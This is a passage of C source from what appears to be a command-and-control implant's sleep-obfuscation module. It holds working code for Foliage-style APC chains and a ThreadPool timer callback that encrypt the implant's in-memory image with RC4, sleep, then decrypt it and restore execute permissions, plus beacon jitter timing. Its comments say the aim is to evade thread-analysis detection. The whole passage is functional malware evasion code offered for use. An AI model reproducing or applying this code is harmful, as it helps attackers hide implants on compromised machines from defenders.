        CONTEXT64 ctx_decrypt;
        spec_memcpy(&ctx_decrypt, &ctx_thread, sizeof(CONTEXT64));
        ctx_decrypt.Rsp -= 8;
        ctx_decrypt.Rip = (QWORD)api->SystemFunction032;
        ctx_decrypt.Rcx = (QWORD)&img_data;
        ctx_decrypt.Rdx = (QWORD)&key_data;

        spec_NtQueueApcThread(hThread, (PVOID)api->NtContinue,
                              &ctx_decrypt, (PVOID)(ULONG_PTR)FALSE, NULL);

        /* 5. NtProtectVirtualMemory → restore RX */
        CONTEXT64 ctx_prot_rx;
        spec_memcpy(&ctx_prot_rx, &ctx_thread, sizeof(CONTEXT64));
        ctx_prot_rx.Rsp -= 8;
        ctx_prot_rx.Rip = (QWORD)spec_NtProtectVirtualMemory;
        ctx_prot_rx.Rcx = (QWORD)((HANDLE)(ULONG_PTR)-1);
        ctx_prot_rx.Rdx = (QWORD)&protect_base;
        ctx_prot_rx.R8  = (QWORD)&protect_size;
        ctx_prot_rx.R9  = (QWORD)PAGE_EXECUTE_READ;
        *(QWORD *)(ctx_prot_rx.Rsp + 0x28) = (QWORD)&old_protect;

        spec_NtQueueApcThread(hThread, (PVOID)api->NtContinue,
                              &ctx_prot_rx, (PVOID)(ULONG_PTR)FALSE, NULL);

        /* 6. SetEvent → signal completion */
        CONTEXT64 ctx_set_event;
        spec_memcpy(&ctx_set_event, &ctx_thread, sizeof(CONTEXT64));
        ctx_set_event.Rsp -= 8;
        ctx_set_event.Rip = (QWORD)api->SetEvent;
        ctx_set_event.Rcx = (QWORD)hEvent;

        spec_NtQueueApcThread(hThread, (PVOID)api->NtContinue,
                              &ctx_set_event, (PVOID)(ULONG_PTR)FALSE, NULL);

        /* Trigger all queued APCs */
        api->NtTestAlert();

        /* Wait for the completion event */
        api->WaitForSingleObject(hEvent, 0xFFFFFFFF);

        /* ---- Post-sleep decryption ---- */
        if (memguard_active) {
            memguard_decrypt(ectx);
        } else {
            sleep_decrypt_heap(sctx);
        }

        /* Clean up */
        api->CloseHandle(hEvent);

        s_foliage_resumed = FALSE;
    }

    return STATUS_SUCCESS;
#endif /* TEST_BUILD */
}

/* ------------------------------------------------------------------ */
/*  ThreadPool sleep method                                            */
/*                                                                     */
/*  Uses TpAllocTimer/TpSetTimer/TpReleaseTimer from ntdll to          */
/*  schedule a callback in the process's native thread pool.           */
/*  The callback encrypts implant memory, sleeps, then decrypts.       */
/*  Because the callback runs in a legitimate pool worker thread,      */
/*  this is the hardest sleep method to detect via thread analysis.    */
/* ------------------------------------------------------------------ */

/* ThreadPool callback context — passed to the timer callback */
typedef struct _TP_CALLBACK_DATA {
    SLEEP_CONTEXT       *sctx;
    DWORD                sleep_ms;
    HANDLE               hEvent;       /* Signaled when callback completes */
    fn_SystemFunction032 SystemFunction032;
    fn_SetEvent          SetEvent;
    USTRING              img_data;
    USTRING              key_data;
    BYTE                 rc4_key[16];
    BOOL                 memguard_active;
    EVASION_CONTEXT     *ectx;
} TP_CALLBACK_DATA;

/* Timer callback — runs in a pool worker thread */
static void __attribute__((ms_abi)) tp_sleep_callback(
    PVOID Instance, PVOID Context, PVOID Timer)
{
    (void)Instance;
    (void)Timer;

    TP_CALLBACK_DATA *cbd = (TP_CALLBACK_DATA *)Context;
    SLEEP_CONTEXT *sctx = cbd->sctx;

    /* 1. Change implant memory to RW */
    PVOID protect_base = sctx->implant_base;
    SIZE_T protect_size = sctx->implant_size;
    ULONG old_protect = 0;

    spec_NtProtectVirtualMemory((HANDLE)(ULONG_PTR)-1,
        &protect_base, &protect_size, PAGE_READWRITE, &old_protect);

    /* 2. Encrypt implant code section via RC4 */
    cbd->SystemFunction032(&cbd->img_data, &cbd->key_data);

    /* 3. Sleep */
    LARGE_INTEGER delay;
    delay.QuadPart = -((long long)cbd->sleep_ms * 10000LL);
    spec_NtDelayExecution(FALSE, &delay);

    /* 4. Decrypt implant code section */
    cbd->SystemFunction032(&cbd->img_data, &cbd->key_data);

    /* 5. Restore RX */
    protect_base = sctx->implant_base;
    protect_size = sctx->implant_size;
    spec_NtProtectVirtualMemory((HANDLE)(ULONG_PTR)-1,
        &protect_base, &protect_size, PAGE_EXECUTE_READ, &old_protect);

    /* 6. Signal completion */
    cbd->SetEvent(cbd->hEvent);
}

NTSTATUS sleep_threadpool(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
#ifdef TEST_BUILD
    /* In test builds, use memguard encrypt/decrypt cycle if available */
    EVASION_CONTEXT *ectx = NULL;
    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;

    if (ectx && ectx->memguard.initialized) {
        NTSTATUS enc_status = memguard_encrypt(ectx);
        if (!NT_SUCCESS(enc_status))
            return enc_status;

        (void)sctx;
        (void)sleep_ms;

        return memguard_decrypt(ectx);
    }

    (void)sctx;
    (void)sleep_ms;
    return STATUS_SUCCESS;
#else
    SLEEP_API *api = &sctx->api;

    /* ThreadPool requires TpAllocTimer, TpSetTimer, TpReleaseTimer */
    if (!api->TpAllocTimer || !api->TpSetTimer || !api->TpReleaseTimer ||
        !api->SystemFunction032 || !api->CreateEventW ||
        !api->SetEvent || !api->CloseHandle || !api->WaitForSingleObject)
        return STATUS_UNSUCCESSFUL;

    /* ---- Memory guard pre-sleep encryption ---- */
    EVASION_CONTEXT *ectx = NULL;
    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;

    BOOL memguard_active = FALSE;
    if (ectx && ectx->memguard.initialized) {
        memguard_setup_return_spoof(ectx);
        memguard_encrypt(ectx);
        memguard_active = TRUE;
    } else {
        /* Legacy: generate key + encrypt heap */
        DWORD k0 = prng_next(), k1 = prng_next();
        DWORD k2 = prng_next(), k3 = prng_next();
        BYTE rc4_key_buf[16];
        rc4_key_buf[0]  = (BYTE)(k0);       rc4_key_buf[1]  = (BYTE)(k0 >> 8);
        rc4_key_buf[2]  = (BYTE)(k1);       rc4_key_buf[3]  = (BYTE)(k1 >> 8);
        rc4_key_buf[4]  = (BYTE)(k2);       rc4_key_buf[5]  = (BYTE)(k2 >> 8);
        rc4_key_buf[6]  = (BYTE)(k3);       rc4_key_buf[7]  = (BYTE)(k3 >> 8);
        rc4_key_buf[8]  = (BYTE)(k0 ^ k2);  rc4_key_buf[9]  = (BYTE)(k1 ^ k3);
        rc4_key_buf[10] = (BYTE)(k0 + k1);  rc4_key_buf[11] = (BYTE)(k2 + k3);
        rc4_key_buf[12] = (BYTE)(k0 ^ 0xAA);rc4_key_buf[13] = (BYTE)(k1 ^ 0x55);
        rc4_key_buf[14] = (BYTE)(k2 ^ 0xCC);rc4_key_buf[15] = (BYTE)(k3 ^ 0x33);
        spec_memset(sctx->sleep_enc_key, 0, 32);
        spec_memcpy(sctx->sleep_enc_key, rc4_key_buf, 16);
        sleep_encrypt_heap(sctx);
    }

    /* Create synchronization event */
    HANDLE hEvent = api->CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent)
        return STATUS_UNSUCCESSFUL;

    /* Set up callback data */
    TP_CALLBACK_DATA cbd;
    spec_memset(&cbd, 0, sizeof(cbd));
    cbd.sctx = sctx;
    cbd.sleep_ms = sleep_ms;
    cbd.hEvent = hEvent;
    cbd.SystemFunction032 = api->SystemFunction032;
    cbd.SetEvent = api->SetEvent;
    cbd.memguard_active = memguard_active;
    cbd.ectx = ectx;

    /* RC4 key for code-section encryption */
    if (memguard_active) {
        DWORD k0 = prng_next(), k1 = prng_next();
        DWORD k2 = prng_next(), k3 = prng_next();
        cbd.rc4_key[0]  = (BYTE)(k0);       cbd.rc4_key[1]  = (BYTE)(k0 >> 8);
        cbd.rc4_key[2]  = (BYTE)(k1);       cbd.rc4_key[3]  = (BYTE)(k1 >> 8);
        cbd.rc4_key[4]  = (BYTE)(k2);       cbd.rc4_key[5]  = (BYTE)(k2 >> 8);
        cbd.rc4_key[6]  = (BYTE)(k3);       cbd.rc4_key[7]  = (BYTE)(k3 >> 8);
        cbd.rc4_key[8]  = (BYTE)(k0 ^ k2);  cbd.rc4_key[9]  = (BYTE)(k1 ^ k3);
        cbd.rc4_key[10] = (BYTE)(k0 + k1);  cbd.rc4_key[11] = (BYTE)(k2 + k3);
        cbd.rc4_key[12] = (BYTE)(k0 ^ 0xAA);cbd.rc4_key[13] = (BYTE)(k1 ^ 0x55);
        cbd.rc4_key[14] = (BYTE)(k2 ^ 0xCC);cbd.rc4_key[15] = (BYTE)(k3 ^ 0x33);
    } else {
        spec_memcpy(cbd.rc4_key, sctx->sleep_enc_key, 16);
    }

    cbd.img_data.Buffer = sctx->implant_base;
    cbd.img_data.Length = (DWORD)sctx->implant_size;
    cbd.img_data.MaximumLength = (DWORD)sctx->implant_size;
    cbd.key_data.Buffer = cbd.rc4_key;
    cbd.key_data.Length = sizeof(cbd.rc4_key);
    cbd.key_data.MaximumLength = sizeof(cbd.rc4_key);

    /* Allocate a thread pool timer */
    PVOID pTimer = NULL;
    NTSTATUS tp_status = api->TpAllocTimer(
        &pTimer, (PVOID)tp_sleep_callback, &cbd, NULL);

    if (!NT_SUCCESS(tp_status) || !pTimer) {
        api->CloseHandle(hEvent);
        return STATUS_UNSUCCESSFUL;
    }

    /* Set timer to fire immediately (DueTime = 0 → now) */
    LARGE_INTEGER due_time;
    due_time.QuadPart = 0;  /* Relative: 0 = fire immediately */
    api->TpSetTimer(pTimer, &due_time, 0, 0);

    /* Wait for the callback to complete */
    api->WaitForSingleObject(hEvent, 0xFFFFFFFF);

    /* ---- Post-sleep decryption ---- */
    if (memguard_active) {
        memguard_decrypt(ectx);
    } else {
        sleep_decrypt_heap(sctx);
    }

    /* Release the timer and clean up */
    api->TpReleaseTimer(pTimer);
    api->CloseHandle(hEvent);

    return STATUS_SUCCESS;
#endif /* TEST_BUILD */
}

/* ------------------------------------------------------------------ */
/*  sleep_init                                                         */
/* ------------------------------------------------------------------ */

NTSTATUS sleep_init(IMPLANT_CONTEXT *ctx) {
    if (!ctx)
        return STATUS_INVALID_PARAMETER;

    /* Cache implant context pointer for sleep methods that need
       evasion_ctx without an extern global */
    s_sleep_impl_ctx = ctx;

    spec_memset(&g_sleep_ctx, 0, sizeof(SLEEP_CONTEXT));

    /* Get sleep config from implant config */
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    if (cfg) {
        g_sleep_ctx.sleep_method = cfg->sleep_method;
    } else {
        g_sleep_ctx.sleep_method = SLEEP_DELAY;
    }

#ifdef TEST_BUILD
    if (g_test_implant_base) {
        g_sleep_ctx.implant_base = g_test_implant_base;
        g_sleep_ctx.implant_size = g_test_implant_size;
    }
#else
    /* Determine implant base and size from PEB */
    PPEB peb = get_peb();
    if (peb) {
        g_sleep_ctx.implant_base = peb->ImageBaseAddress;
        /* Parse PE to get SizeOfImage */
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peb->ImageBaseAddress;
        if (dos && dos->e_magic == 0x5A4D) {
            PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(
                (BYTE *)peb->ImageBaseAddress + dos->e_lfanew);
            g_sleep_ctx.implant_size = nt->OptionalHeader.SizeOfImage;
        }
    }

    /* Resolve APIs for sleep methods that need Win32/NT APIs */
    if (g_sleep_ctx.sleep_method != SLEEP_DELAY) {
        if (!sleep_resolve_apis(&g_sleep_ctx.api)) {
            /* Fall back to simple delay if API resolution fails */
            g_sleep_ctx.sleep_method = SLEEP_DELAY;
        }
    }
#endif

    /* Seed PRNG from TSC */
    prng_seed_from_tsc();

    /* Store context pointer */
    ctx->sleep_ctx = &g_sleep_ctx;

    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  sleep_cycle                                                        */
/* ------------------------------------------------------------------ */

NTSTATUS sleep_cycle(IMPLANT_CONTEXT *ctx) {
    if (!ctx || !ctx->sleep_ctx)
        return STATUS_INVALID_PARAMETER;

    SLEEP_CONTEXT *sctx = (SLEEP_CONTEXT *)ctx->sleep_ctx;
    IMPLANT_CONFIG *cfg = cfg_get(ctx);
    DWORD sleep_ms;

    /* Check if comms has a profile with timing config */
    BOOL use_profile_timing = FALSE;
    if (ctx->comms_ctx) {
        PROFILE_CONFIG *prof = comms_get_profile_ptr(ctx->comms_ctx);
        if (prof && prof->initialized &&
            prof->timing.callback_interval > 0) {
            /* Get approximate current hour/dow.
             * In production, read from KUSER_SHARED_DATA.
             * For now, use a simplified approach. */
            DWORD current_hour = 12; /* Default: assume working hours */
            DWORD current_dow = 2;   /* Default: Wednesday */

#ifndef TEST_BUILD
            /* Read system time from KUSER_SHARED_DATA */
            volatile QWORD *shared_time = (volatile QWORD *)0x7FFE0008ULL;
            QWORD sys_time = *shared_time;
            /* Convert FILETIME to approximate hour/dow */
            /* FILETIME: 100-ns intervals since 1601-01-01 */
            /* Seconds since epoch ≈ sys_time / 10000000 */
            QWORD seconds = sys_time / 10000000ULL;
            /* Hours since midnight: seconds / 3600 mod 24 */
            current_hour = (DWORD)((seconds / 3600ULL) % 24ULL);
            /* Day of week: Jan 1 1601 was Monday (dow=0) */
            QWORD days = seconds / 86400ULL;
            current_dow = (DWORD)(days % 7ULL); /* 0=Mon */
#endif
            sleep_ms = sleep_calc_profile_jitter(&prof->timing,
                                                  current_hour, current_dow);
            use_profile_timing = TRUE;
        }
    }

    if (!use_profile_timing) {
        DWORD base_interval = cfg ? cfg->sleep_interval : 60000;
        DWORD jitter_pct    = cfg ? cfg->jitter_percent  : 0;
        sleep_ms = sleep_calc_jitter(base_interval, jitter_pct);
    }

    if (sleep_ms == 0)
        return STATUS_SUCCESS;

    switch (sctx->sleep_method) {
    case SLEEP_EKKO:
        return sleep_ekko(sctx, sleep_ms);
    case SLEEP_WFS:
        return sleep_wfs(sctx, sleep_ms);
    case SLEEP_FOLIAGE:
        return sleep_foliage(sctx, sleep_ms);
    case SLEEP_THREADPOOL:
        return sleep_threadpool(sctx, sleep_ms);
    case SLEEP_DELAY:
    default:
        return sleep_delay(sctx, sleep_ms);
    }
}

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void sleep_test_set_random_seed(DWORD seed) {
    g_test_random_seed = seed;
    g_test_seed_set = TRUE;
}

void sleep_test_set_implant_region(PVOID base, SIZE_T size) {
    g_test_implant_base = base;
    g_test_implant_size = size;
}
#endif
